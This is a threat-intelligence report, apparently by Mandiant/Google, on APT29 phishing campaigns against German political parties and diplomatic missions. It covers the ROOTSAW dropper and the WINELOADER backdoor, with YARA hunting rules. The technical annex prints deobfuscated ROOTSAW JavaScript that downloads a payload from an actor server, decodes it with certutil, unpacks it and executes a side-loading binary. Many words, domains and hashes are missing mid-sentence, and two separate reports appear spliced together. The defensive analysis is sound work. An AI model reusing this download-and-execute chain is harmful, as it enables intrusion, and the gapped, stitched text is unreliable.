quality of , and the use of single-use  components.\\nMITRE ATT&CK mappings, mitigation suggestions, and threat-hunting queries are provided below to assist  in identifying similar activity in their .

Consistent with APT29 operations extending back to 2021, this operation leveraged APT29’s mainstay first-stage payload ROOTSAW (aka EnvyScout) to deliver a new backdoor variant publicly tracked as\\xa0WINELOADER.\\xa0Notably, this activity represents a departure from this APT29 initial access cluster’s typical remit of targeting governments, foreign embassies, and other diplomatic missions, and is the first time Mandiant has seen an operational interest in political parties from this APT29 subcluster. , while APT29 has previously\\xa0used lure documents bearing the logo of German government , this is the first instance where we have seen the group use German-language lure content — a possible artifact of the targeting differences (i.e. domestic vs. foreign) between the two operations.\\xa0Phishing emails were sent to victims purporting to be an invite to a dinner reception on 01 March bearing a logo from the Christian Democratic Union (CDU), a major political party in Germany (see Figure 1).\\xa0The German-language lure document contains a phishing link directing victims to a malicious ZIP file containing a ROOTSAW dropper hosted on an actor-controlled compromised website “https://[.]org/invite.php”.\\xa0ROOTSAW delivered a second-stage CDU-themed lure document and a next stage\\xa0WINELOADER payload retrieved from “[.]org/util.php”.\\xa0WINELOADER was first observed in operational use in late January 2024 in an operation targeting likely diplomatic entities in Czechia, Germany, India, Italy, Latvia, and Peru.\\xa0The backdoor contains several features and functions that overlap with several known APT29 malware families including BURNTBATTER, MUSKYBEAT and BEATDROP, indicating they are likely created by a common developer (see Technical Annex for additional details).Figure 1: Lure document redirecting victims to an APT29 controlled compromised WordPress website hosting  2: Second CDU lure displayed by ROOTSAW  &  continues to be the central component of APT29’s initial access efforts to collect foreign political . The first-stage malware’s expanded use to target German political parties is a noted departure from the typical diplomatic focus of this APT29 subcluster, and almost certainly reflects the SVR’s interest in gleaning information from political parties and other aspects of civil society that could advance Moscow’s  interests.\\xa0As highlighted in our\\xa0previous research detailing APT29’s operations in the first-half of 2023, these malware delivery operations are highly adaptive, and continue to evolve in lockstep with Russia’s  realities. We therefore suspect that APT29’s interest in\\xa0 these  is unlikely to be limited to Germany. Western political parties and their associated bodies from across the political spectrum are likely also possible targets for future SVR-linked cyber espionage activity given Moscow’s vital interest in  changing Western political dynamics related to Ukraine and other flashpoint foreign policy issues.\\xa0Based on recent activity from other APT29 subclusters, attempts to achieve initial access beyond phishing may include attempts to subvert cloud-based  mechanisms or brute force methods such as password spraying. For more details regarding APT29’s recent tactics, please see the February 2024\\xa0advisory from the United Kingdom’s National Cyber Security Center (NCSC).Technical   as early as 26 February 2024, APT29 distributed phishing attachments containing links to an actor-controlled compromise website, “[.]org/invite.php”, to redirect victims to a ROOTSAW dropper. This ROOTSAW variant uses the same\\xa0JavaScript obfuscation resource\\xa0used in previous APT29 operations, and ultimately results in a request to download and execute the second stage WINELOADER from the same server at\\xa0 “[.]org/util.php”.\\xa0The ROOTSAW payload contains a\\xa0  payload, that when parsed, results in the following code that is responsible for downloading a file to disk as “invite.txt”, decoding it using Windows Certutil, then  the code using tar. Finally, the legitimate Windows binary (SqlDumper.exe) is executed by the actor.var\\xa0a\\xa0=\\xa0new\\xa0(\"Wscript.Shell\");function\\xa0Ijdaskjw(_0x559297)\\xa0{\\xa0 var\\xa0_0x3bd487\\xa0=\\xa0new\\xa0();\\xa0 _0x3bd487.\\xa0=\\xa0function\\xa0()\\xa0{\\xa0\\xa0\\xa0 if\\xa0(_0x3bd487.readyState\\xa0==\\xa00x4\\xa0&&\\xa0_0x3bd487.status\\xa0==\\xa00xc8)\\xa0{\\xa0\\xa0\\xa0\\xa0\\xa0 var\\xa0_0x11aa10\\xa0=\\xa0_0x3bd487.response;\\xa0\\xa0\\xa0\\xa0\\xa0 var\\xa0_0xce698d\\xa0=\\xa0new\\xa0(\"Scripting.\");\\xa0\\xa0\\xa0\\xa0\\xa0 var\\xa0_0x20081c\\xa0=\\xa0_0xce698d.(\"C:\\\\\\\\Windows\\\\\\\\Tasks\\\\\\\\invite.txt\",\\xa00x2,\\xa0true,\\xa00x0);\\xa0\\xa0\\xa0\\xa0\\xa0 _0x20081c.Write(_0x11aa10);\\xa0\\xa0\\xa0\\xa0\\xa0 _0x20081c.close();\\xa0\\xa0\\xa0\\xa0\\xa0 a.Run(\"certutil\\xa0-decode\\xa0C:\\\\\\\\Windows\\\\\\\\Tasks\\\\\\\\invite.txt\\xa0C:\\\\\\\\Windows\\\\\\\\Tasks\\\\\\\\invite.zip\",\\xa00x0);\\xa0\\xa0\\xa0\\xa0\\xa0 var\\xa0_0x245d53\\xa0=\\xa0Date.now();\\xa0\\xa0\\xa0\\xa0\\xa0 var\\xa0_0x3f9f72\\xa0=\\xa0null;\\xa0\\xa0\\xa0\\xa0\\xa0 do\\xa0{\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0 _0x3f9f72\\xa0=\\xa0Date.now();\\xa0\\xa0\\xa0\\xa0\\xa0 }\\xa0while\\xa0(_0x3f9f72\\xa0-\\xa0_0x245d53\\xa0<\\xa00xbb8);\\xa0\\xa0\\xa0\\xa0\\xa0 a.Run(\"tar\\xa0-xf\\xa0C:\\\\\\\\Windows\\\\\\\\Tasks\\\\\\\\invite.zip\\xa0-C\\xa0C:\\\\\\\\Windows\\\\\\\\Tasks\\\\\\\\\\xa0\",\\xa00x0);\\xa0\\xa0\\xa0\\xa0\\xa0 var\\xa0_0x245d53\\xa0=\\xa0Date.now();\\xa0\\xa0\\xa0\\xa0\\xa0 var\\xa0_0x3f9f72\\xa0=\\xa0null;\\xa0\\xa0\\xa0\\xa0\\xa0 do\\xa0{\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0 _0x3f9f72\\xa0=\\xa0Date.now();\\xa0\\xa0\\xa0\\xa0\\xa0 }\\xa0while\\xa0(_0x3f9f72\\xa0-\\xa0_0x245d53\\xa0<\\xa00xdac);\\xa0\\xa0\\xa0\\xa0\\xa0 a.Run(\"C:\\\\\\\\Windows\\\\\\\\Tasks\\\\\\\\SqlDumper.exe\",\\xa00x0);\\xa0\\xa0\\xa0 }\\xa0 };\\xa0 _0x3bd487.open(\"GET\",\\xa0_0x559297,\\xa0true);\\xa0 _0x3bd487.send(null);}Ijdaskjw(\"https://.org/util.php\");Invite.pdf (MD5: )Second CDU-themed PDF lure  in LibreOffice 6.4 by default user “Writer”Metadata documents the PDF as en-GB  to https://[.]org/invite.phpinvite.php (MD5: )Zip file containing  from https://[.]org/invite.phpExecutes .hta (MD5: )ROOTSAW downloader containing obfuscated  from https://[.]org/util.phpExtracts  .txt (MD5: )Malicious certificate file, extracted using Windows  from  from https://[.]org/util.phpinvite.zip (MD5: )Malicious zip containing  from   .exe (MD5: )Legitimate Microsoft file Sqldumper used for side  of  is likely a variant of the non-public historic BURNTBATTER and MUSKYBEAT code families which Mandiant uniquely associates with APT29. It shares a similar design and pattern,  around the invocation of the malware and the anti-analysis techniques used. However, the code family itself is  more customized than the previous variants, as it no longer uses publicly available loaders like DONUT or DAVESHELL and implements a unique C2 mechanism. , WINELOADER contains the following shared techniques with other code families used by APT29:The RC4 algorithm used to decrypt the next stage payload;Process/DLL name check to validate the payload context (in use since early BEATDROP variants);Ntdll usermode hook bypass (in use since early BEATDROP variants).WINELOADER is invoked via a DLL side loading technique into a legitimate Windows executable and starts to decrypt the main implant logic itself using RC4. This first layer of  was first witnessed in the MUSKYBEAT/BURNTBATTER malware families and was originally used to decrypt a second file also stored in the zip file. Within WINELOADER, it is used to decrypt a region of memory containing the actual WINELOADER module. This module is a compiled position independent shellcode which contains references within itself to strings and decryption modules.\\xa0The decryption function then moves execution to this position independent shellcode.\\xa0ZScaler refers to this resource as the WINELOADER core module, and notes that it contains settings (C2 information, RC4 decryption keys) and strings. Based on samples identified by Mandiant, the WINELOADER resource contains 70 encrypted strings and both samples have the default sleep timer of 2 seconds configured.WINELOADER  using HTTP GET requests using a user agent contained within the resource. Each packet to the C2 server contains a random size  packet, this packet contains environment information like the victim’s username/device name, the process name and some information that could be used by the actor to determine whether the compromised system is a valid target (parent process path, etc.). The response from the C2 server can task the WINELOADER to execute a new module (either within the same process, or via process injection) and to update the sleep timer.\\xa0Although Mandiant was unable to obtain commands from the actor, ZScaler reported that they were able to receive a command to persist WINELOADER which resulted in a run key to be configured on the device.\\xa0.dll (MD5: )WINELOADER  to https://[.]com/auth..dll (MD5: )WINELOADER downloader\\xa0 to https://[.]com/auth.phpMITRE ATT&CK .003Windows   Information  Token   Service  Files or .004File .003Thread Execution  and Directory  {\\xa0\\xa0\\xa0\\xa0meta:\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0author = \"Mandiant\"\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0disclaimer = \"This rule is meant for hunting and is not tested to run in a production environment.\"\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0description = \"Detects obfuscated ROOTSAW payloads\"\\xa0\\xa0\\xa0\\xa0\\xa0strings:\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0$ = \"function _\"\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0$ = \"new ();\"\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0$ = \"\\'\\\\\\\\x2e\\\\\\\\x7a\\\\\\\\x69\\\\\\\\x70\\'\"\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0$ = \"\\'\\\\\\\\x4f\\\\\\\\x70\\\\\\\\x65\\\\\\\\x6e\\'\"\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0$ = \"\\\\\\\\x43\\\\\\\\x3a\\\\\\\\x5c\\\\\\\\x57\"\\xa0\\xa0\\xa0\\xa0\\xa0condition:\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0all of them}rule {\\xa0\\xa0\\xa0\\xa0meta:\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0author = \"Mandiant\"\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0disclaimer = \"This rule is meant for hunting and is not tested to run in a production environment.\"\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0description = \"Detects rc4 decryption logic in WINELOADER samples\"\\xa0\\xa0\\xa0\\xa0\\xa0strings:\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0$ = {B9 00 01 00 00 99 F7 F9 8B 44 24 [50-200] 0F B6 00 3D FF 00 00 00} // Key \\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0$ = {0F B6 00 3D FF 00 00 00} // Key size\\xa0\\xa0\\xa0\\xa0\\xa0condition:\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0all of them\\xa0}rule {\\xa0\\xa0\\xa0\\xa0meta:\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0author = \"Mandiant\"\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0disclaimer = \"This rule is meant for hunting and is not tested to run in a production environment.\"\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0description = \"Detects payload invocation stub in WINELOADER\"\\xa0\\xa0\\xa0\\xa0\\xa0strings:\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0// 48 8D 0D ?? ?? 00 00\\xa0 lea rcx,  (Pointer to encrypted resource)\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0// 48 C7 C2 ?? ?? 00 00\\xa0 mov rdx, ????

Notably, as part of this activity, we have seen phishing emails targeting a wide range of diplomatic  in Kyiv including those of Moscow’s partners,  the first time we have observed this cluster of APT29 activity pursuing governments  aligned with Russia. Based on the timing and focus of APT29’s Ukraine-focused operations, we judge they are intended to aid Russia’s Foreign  Service (SVR) in  collection concerning the current pivotal phase of the war.\\xa0APT29’s increased phishing activity in Ukraine has occurred alongside an uptick in the group’s more routine espionage operations against global diplomatic entities. Across these malware delivery operations, APT29 continues to prioritise European Ministries of Foreign Affairs and embassies, but it has also sustained operations that are global in scope and  of Russia’s far-reaching ambitions and interests in other regions. The current secondary focus is  in Asia, with governments in Türkiye (formerly known as Turkey), India, and other regions of vital strategic importance to Moscow such as Africa factoring into its 2023 priorities. We judge that Russia’s war in Ukraine has almost certainly shaped APT29’s espionage priorities, but it has not supplanted them.\\xa0We track this diplomatic-focused phishing activity as  distinct from APT29’s ongoing initial access operations targeting cloud-based Microsoft products. Although APT29’s cloud-focused  may lead to the compromise of diplomatic entities, variance in the scale, quality and targeting patterns of the two lines of effort indicate that they are highly likely distinct initial access clusters operating with different priorities and levels of capability. However, we continue to see significant overlap in post-compromise methods across both lines of effort, indicating that multiple initial access teams may hand-off to a centralized  team once inside a victim environment.Figure 1: APT29’s distinct initial access  the increased pace of operations and changes in targeting, we have also seen a major shift in the group’s tooling and tradecraft. APT29 has rebuilt several of its tools and has made repeated iterative  to its existing malware delivery chain, likely to ensure its operational longevity despite long-term persistent use. We assess that several of these changes are highly likely  designed to sidestep research methods and tools commonly used by the threat  community to track their operations, indicating that operational security priorities continue to factor heavily into APT29’s tooling decisions.APT29’s Evolving Approach to Malware  in 2021, APT29 adopted a tactic called HTML smuggling in its malware delivery operations, hiding its first-stage JavaScript dropper in malicious HTML attachments we call ROOTSAW (also known as EnvyScout). As detailed in previous research by Mandiant, CERT-Polska, Palo Alto Networks and others, ROOTSAW has been a constant feature of APT29\\'s operations over the past two years and has been the primary vehicle to decode and deliver the group’s next stage malware.\\xa0 Upon opening the archive file, victims are presented with either a Windows shortcut (LNK) file or a legitimate software binary, that when opened, executes an  DLL, leading to commodity backdoors such as BEACON or BRC4 (Brute Ratel C4) executing on the system.\\xa0ROOTSAW’s central and continued role in APT29 operations has spurred changes to the malware delivery chain over time. The most visible change has been the move away from HTML attachments as the initial infection vector, with APT29 shifting to hosting its first-stage payloads on compromised web services such as WordPress sites. Migrating the first-stage payload server side has likely provided APT29 a greater degree of control over its malware delivery chain and allowed the group to be more judicious about the exposure of its later-stage . For example, to prevent detection of malware in  not intended for compromise, APT29 has implemented various forms of filtering in its first-stage payloads and has removed staged malware from compromised servers shortly after operational use. Notably, these efforts have also prevented payloads being acquired by public malware  and other common security research tools, helping to avoid detection and extend the operational lifespan of its newer malware variants.Figure 2: APT29’s diverse first-stage delivery methodsAs shown\\xa0 the following campaigns tracked throughout the first half of 2023 detail, APT29 has made continuous, iterative efforts to introduce additional obfuscation and anti-analysis components into its operations. The group has  with various obfuscation techniques such as the use of JavaScript Obfuscator, delivery and execution guardrails, hosting decryption keys server side, and delivering decoy documents when victim profiling checks fail. In this accelerated period of tooling evolution, the group has also begun to rotate in novel malware delivery tools and techniques instead of its mainstay first-stage payload.\\xa0March 2023: Earthquake-Themed Türkiye CampaignIn March 2023, Mandiant identified a new APT29 phishing campaign targeting Türkiye. The phishing waves  the Turkish Deputy Minister of Foreign Affairs and included a phishing link accompanied by content related to the February 2023 earthquake that struck southern Türkiye.\\xa0The first wave, conducted in early March, used a phishing link generated by a URL shortening service “https://tinyurl[.]com/mrxcjsbs” to redirect victims to a ROOTSAW dropper hosted on an actor-controlled compromised website “https://www.[.]com/e-yazi.htm/?v=”.When visited, the URL downloaded the ROOTSAW dropper \"e-yazi.htm\" (MD5: ) to drop additional files onto the victim machine, including a malicious ISO, \"e-yazi.iso\" (MD5: ).This is the first time Mandiant has seen APT29 introduce an additional layer of obfuscation to its phishing links using a URL shortening service.\\xa0The second wave, victims were directed to\\xa0an actor-controlled compromised website “https://[.]com/e-yazi.html” to download the ROOTSAW dropper \"e-yazi.html\" (MD5: ).\\xa0The second ROOTSAW sample dropped similar decoy content and a malicious ZIP file, e-yazi.zip (MD5: ), that contained second-stage downloaders and an additional ROOTSAW dropper file.In both waves, APT29  a new version of ROOTSAW with added user-agent based anti-analysis guardrails. This variant checks the user-agent of the device, looking for Windows operating systems that do not contain “.NET” and contain the value “Windows NT”. As a result, if the victim is running a non-Windows based operating system or the request is made through .NET, the server will deliver a decoy PDF file. In the second wave, this PDF file was identical to the version contained in the malicious ZIP payload. This filtering tactic is likely used to identify automated downloaders and non-compatible victim devices, further reducing the odds of exposing malware in non-compromise contexts. Each payload within the new ROOTSAW variant is obfuscated using a unique key, although the  routine remains the same.Figure 3: ROOTSAW user-agent and operating system check to determine which file to deployMarch 2023: European Diplomatic-Focused Phishing CampaignsIn an additional phishing campaign in March 2023, APT29 targeted various diplomatic missions in Europe. Notably, in the two weeks that lapsed between the Turkey campaign, further changes were identified resulting in two new variants of ROOTSAW that shifted the newly added anti-analysis guardrails server side.In the first wave, emails contained a PDF attachment (MD5: ) inviting victims to a drink reception following an event on the “Future of  Economic Relations” from the Embassy of Spain. The PDF contains a link to an actor-hosted ROOTSAW variant hosted at “https://[.]cl/note.html”, ultimately leading to the deployment of MUSKYBEAT (also known publicly as QUARTERRIG).This version of ROOTSAW sends the victim’s user-agent to the compromised server using an HTTP GET request “https://[.]cl/note.php?ua=<value>”.\\xa0 The server then performs filtering based on an actor-defined denylist, finally returning a decryption key for the payload if the tests are  passed.\\xa0If these tests fail, ROOTSAW drops a corrupt file, rather than exposing the embedded decoy file like in previous versions.\\xa0\\xa0In the second wave, APT29 delivered an additional new variant of ROOTSAW (MD5: ), containing both user-agent and IP filtering, but ultimately leading to the same MUSKYBEAT downloader.\\xa0This version conducts an additional check by obtaining the victim’s IP address through a request to a public API service “https://api.ipify[.]org/?format=json”.Figure 4: ROOTSAW payload decryption routine\\xa0April 2023: Old Wine in a New BottleIn April 2023, APT29 continued to modify its standard malware delivery chain, introducing a new technique for malware delivery. In this operation, APT29 re-used one its frequent diplomatic event-themed lure documents spoofing the Czechia Embassy (more commonly known as the Czech Republic) that invited targets to a wine tasting event on April 13, 2023. The document contained a link to the phishing website “https://sylvio[.]com[.]br/form.php”, which delivered either an ISO or a ZIP archive to the victim.\\xa0Rather than using ROOTSAW, victims were delivered a malicious ISO or ZIP file directly from the compromised web server if they  passed the server-side filtering checks.\\xa0The decision to remove the HTML smuggling stage of the infection chain was likely intended to further reduce the number of forensic artifacts left on the host that are prone to detection or later analysis.May 2023: Ukraine Foreign Embassy-Focused CampaignsIn May, in the lead up to Ukraine’s , APT29 conducted two distinct phishing waves targeting a wide range of diplomatic  in Kyiv, including those of Moscow’s partners. Each campaign adopted separate intrusion chains similar to those seen in March and April 2023.\\xa0In the first wave in early May, an repurposed advert for a BMW sale in Kyiv was circulated, directing victims to an actor-controlled server at “https://[.]com/bmw.htm”, which delivered a weaponized ISO file, \"bmw.iso\" (MD5: ).The version of ROOTSAW used in this campaign shares  to variants used in March against Türkiye. Depending on user-agent filtering, the ISO or a decoy image of the BMW would be displayed.In the second wave mid-May, an invite for a charity concert in Kyiv with a mistyped filename “Invintation.zip” (MD5: ) was sent to targets, likely also using a copy of a legitimate document.\\xa0\\xa0Similar to the April wine-themed campaign, payloads were hosted directly on actor-controlled  that used user-agent filtering to deliver either a ZIP file with decoy PDF documents (MD5:), or a ZIP file containing a second-stage payloads (MD5:) to victims.Figure 5: Likely repurposed legitimate invite to a charity concert in UkraineJune 2023: Split ROOTSAW CampaignIn late June, Mandiant identified an additional APT29 phishing campaign with a new variant of ROOTSAW to target a European government. Phishing emails were sent from a compromised North American government email address and crafted to appear as an invitation to a public holiday celebration from Norwegian embassy personnel. Two different delivery mechanisms were used in this campaign, a PDF (MD5: ) containing a link to an actor-hosted ROOTSAW variant, and emails with an attached Scalable Vector Graphic (SVG) file (MD5: ) rather than the typical HTML payload.Notably, although APT29 used a compromised WordPress server to host the ROOTSAW payload, non-valid targets received a generic HTTP 404 error rather than the traditional WordPress 404.\\xa0\\xa0Mandiant has identified that once APT29 removes the server side , the compromised WordPress site will start displaying the correct WordPress 404 error indicating that the file was not found. We therefore suspect that  compromised by APT29 to deliver malware will likely not find logs for this activity within WordPress, although they may exist within other services such as the underlying web server.\\xa0The ROOTSAW variant contained in the SVG file is similar to those first identified in 2021, indicating that the threat actor may have only recently adopted SVG files for its HTML smuggling technique. Consistent with other cases where APT29 has introduced new delivery methods for ROOTSAW, the group reverted to a primitive ROOTSAW payload without anti-analysis techniques or other forms of hardening.Figure 6: Traditional 404 error from compromised APT29  7: 404 error from IP filtered by APT29July 2023: ICEBEAT CampaignIn July, APT29 continued to experiment with new ROOTSAW delivery mechanisms and victim filtering  in an operation deploying a new downloader ICEBEAT to target European diplomatic entities. Emails were sent purporting to be an invite from a non-specified German embassy for an Ambassador’s farewell reception. Of note, ICEBEAT’s use of the open source Zulip messaging platform for command and control (C2) follows a pattern of past APT29 downloaders using legitimate services for command and control including Dropbox, Firebase, OneDrive and Trello.For the first time in this campaign, ROOTSAW was contained within a PDF document. When opened, the PDF document writes an HTML file to disk, that when launched, writes a follow-on ZIP file to disk and beacons to an actor controlled domain “https://sgrfh[.]org.pk/wp-content/idx.php?n=ks&q=<>” to profile victim information.\\xa0Victims who met filtering  were delivered a Save the date decoy PDF document (MD5: ) and delivered the next-stage downloader ICEBEAT that is responsible for downloading follow-on  from the Zulip messaging service.\\xa0In instances where the victim did not meet filtering , a separate benign decoy document referencing German Unity Day (MD5: ) was delivered in place of ICEBEAT.\\xa0Figure 8: Decoy lure used by APT29 for filtered  9: PDF decoy document used during successful malware  Choices Possibly Reflect Distinct APT29 Subteams\\xa0Beyond the continued adaptation of APT29’s malware delivery chain, Mandiant has also observed dedicated efforts to update and evolve the group’s later-stage malware into multiple variations, increasing the quantity and quality of tooling used across its campaigns. At least six distinct downloaders have been identified during the first half of 2023:\\xa0BURNTBATTER is an in-memory loader responsible for decrypting and executing a payload from disk into a running process. BURNTBATTER has been witnessed loading the SPICYBEAT downloader via a position-independent shellcode dropper called DONUT.DONUT is a publicly available tool that creates position-independent shellcode that loads .NET assemblies, PE files, and other Windows payloads from memory and runs them with parameters.SPICYBEAT is a downloader written in C++ responsible for downloading a next-stage payload from either DropBox or Microsoft\\'s OneDrive.MUSKYBEAT is an in-memory dropper that decodes the next-stage payload and strings using RC4 and executes in the current process.STATICNOISE is a downloader written in C responsible for downloading and executing the final-stage payload in memory.DAVESHELL is shellcode that functions as an in-memory dropper relying on reflective injection. Its embedded payload is mapped into memory and executed. DAVESHELL is based in the public available repository.Figure 10: APT29’s Second-Stage Downloaders Used in 2023As noted in the June 2023 campaign, we have also witnessed APT29 operating various infection chains  within a single campaign, suggesting that distinct initial access operators or subteams may be operating in parallel to service different regional targets or espionage objectives. Although we have been unable to ascertain the specific logic behind decisions about which malware delivery approach to use or when to introduce new later-stage malware variants, we judge with low confidence that they are likely driven by mission-specific parameters such as targets or operational objectives.The first use of new  are typically reserved for targets inside Ukraine or diplomatic entities associated with North Atlantic Treaty  (NATO) or European Union (EU) member states, areas of likely heightened strategic importance given Moscow’s need to understand political and military dynamics surrounding its war in Ukraine.Upon first use of new tactics or tools in higher risk , we have observed APT29 incorporate these new tools into its broader operations with minimal changes, pointing to the group’s possible changing risk calculus after first exposure.\\xa0Patterns of controlled first-use possibly extend back to the emergence of APT29’s diplomatic-focused phishing cluster in 2021. In May 2021, during Russia’s initial troop-build up around Ukraine, Mandiant identified an APT29 operation using ICEBREAKER, a modified variant of BOOMMIC (also known as VaporRage) embedded in software mimicking an installer for a legitimate Ukrainian government application. As detailed by SentinelOne, multiple aspects of the malware delivery chain were likely tailored for a highly-targeted operation against Ukrainian government entities. increased scope and frequency of APT29\\'s diplomatic-focused spear phishing campaigns in the first half of 2023 has compelled the initial access team to make repeated  to its long-standing malware delivery chain. Efforts to move  server side, introduce anti-analysis components, and deliver decoy documents in non-compromise contexts have likely helped the group extend the shelf-life of its ROOTSAW-centred concept of operations. Even with this  pace of change, the group has remained highly operational security conscious, and has taken repeated steps to circumvent the methods that security researchers use to track and respond to its activity.\\xa0APT29\\'s increased operational tempo has also exposed patterns of operations that likely reflect different initial access operators or subteams supported by a centralized development team. More generally, these patterns likely reflect a growing mission and pool of resources dedicated to collecting political  and that group will almost certainly continue to pose a high severity threat to governments and diplomatic entities globally.Protecting The CommunityAs part of our efforts to combat serious threat actors, TAG uses the results of our research to improve the safety and security of Google’s products.
